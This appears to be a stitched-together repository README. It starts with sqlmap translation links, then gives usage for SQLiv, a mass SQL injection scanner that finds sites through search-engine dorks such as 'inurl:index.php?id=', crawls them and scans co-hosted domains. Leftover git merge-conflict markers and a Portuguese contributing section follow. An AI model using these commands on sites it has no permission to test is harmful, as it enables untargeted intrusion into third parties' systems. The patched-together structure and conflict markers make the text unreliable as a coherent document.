* [Kurdish (Central)](https://github.com/sqlmapproject/sqlmap/blob/master/doc/translations/README-ckb-KU.md)
* [Persian](https://github.com/sqlmapproject/sqlmap/blob/master/doc/translations/README-fa-IR.md)
* [Polish](https://github.com/sqlmapproject/sqlmap/blob/master/doc/translations/README-pl-PL.md)
* [Portuguese](https://github.com/sqlmapproject/sqlmap/blob/master/doc/translations/README-pt-BR.md)
* [Russian](https://github.com/sqlmapproject/sqlmap/blob/master/doc/translations/README-ru-RU.md)
* [Serbian](https://github.com/sqlmapproject/sqlmap/blob/master/doc/translations/README-rs-RS.md)
* [Slovak](https://github.com/sqlmapproject/sqlmap/blob/master/doc/translations/README-sk-SK.md)
* [Spanish](https://github.com/sqlmapproject/sqlmap/blob/master/doc/translations/README-es-MX.md)
* [Turkish](https://github.com/sqlmapproject/sqlmap/blob/master/doc/translations/README-tr-TR.md)
* [Ukrainian](https://github.com/sqlmapproject/sqlmap/blob/master/doc/translations/README-uk-UA.md)
* [Vietnamese](https://github.com/sqlmapproject/sqlmap/blob/master/doc/translations/README-vi-VN.md)


SQLiv
===

### Massive SQL injection scanner  
**Features**  
1. multiple domain scanning with SQL injection dork by Bing, Google, or Yahoo
2. targetted scanning by providing specific domain (with crawling)
3. reverse domain scanning

> both SQLi scanning and domain info checking are done in multiprocessing  
> so the script is super fast at scanning many urls

> quick tutorial & screenshots are shown at the bottom  
> project contribution tips at the bottom  

---

**Installation**  
1. git clone https://github.com/the-robot/sqliv.git
2. sudo python2 setup.py -i

> Dependencies  
> - [bs4](https://pypi.python.org/pypi/bs4)  
> - [termcolor](https://pypi.python.org/pypi/termcolor)  
> - [google](https://pypi.python.org/pypi/google)
> - [nyawc](https://pypi.python.org/pypi/nyawc/)

**Pre-installed Systems**  
- [BlackArch Linux](https://blackarch.org/scanner.html) ![BlackArch](https://raw.githubusercontent.com/BlackArch/blackarch-artwork/master/logo/logo-38-49.png)

---
### Quick Tutorial  
**1. Multiple domain scanning with SQLi dork**  
- it simply search multiple websites from given dork and scan the results one by one
```python
python sqliv.py -d <SQLI DORK> -e <SEARCH ENGINE>  
python sqliv.py -d "inurl:index.php?id=" -e google  
```

**2. Targetted scanning**  
- can provide only domain name or specifc url with query params
- if only domain name is provided, it will crawl and get urls with query
- then scan the urls one by one
```python
python sqliv.py -t <URL>  
python sqliv.py -t www.example.com  
python sqliv.py -t www.example.com/index.php?id=1  
```

**3. Reverse domain and scanning**  
- do reverse domain and look for websites that hosted on same server as target url
```python
python sqliv.py -t <URL> -r
```

**4. Dumping scanned result**
- you can dump the scanned results as json by giving this argument
```python
python sqliv.py -d <SQLI DORK> -e <SEARCH ENGINE> -o result.json
```

**View help**  
```python
python sqliv.py --help

usage: sqliv.py [-h] [-d D] [-e E] [-p P] [-t T] [-r]

optional arguments:
  -h, --help  show this help message and exit
  -d D        SQL injection dork
  -e E        search engine [Google only for now]
  -p P        number of websites to look for in search engine
  -t T        scan target website
  -r          reverse domain
```

---
### screenshots
![1](https://raw.githubusercontent.com/Hadesy2k/sqliv/master/screenshots/1.png)
![2](https://raw.githubusercontent.com/Hadesy2k/sqliv/master/screenshots/2.png)
![3](https://raw.githubusercontent.com/Hadesy2k/sqliv/master/screenshots/3.png)
![4](https://raw.githubusercontent.com/Hadesy2k/sqliv/master/screenshots/4.png)

---

### Development
**TODO**  
1. POST form SQLi vulnerability testing


------------------------------------------------------------------------------------------------------




<<<<<<< HEAD
=======

------------------------------------------------------------------------------------------------------



















>>>>>>> 926d3f0 (Adicionando Modulos AI-Adversarial Attackss)

## 📚 Como Contribuir

1. **Fork** o repositório
2. **Branch** com sua feature (`git checkout -b feature/x`)
3. **Commit** e **Push** (`git commit -m "feat: descrição" && git push origin feature/x`)
4. **Pull Request** detalhando mudanças

---

## 📜 Licença

MIT License

> **Disclaimer:** Ferramentas para uso em ambientes autorizados e fins educacionais. Seja responsável e ético.

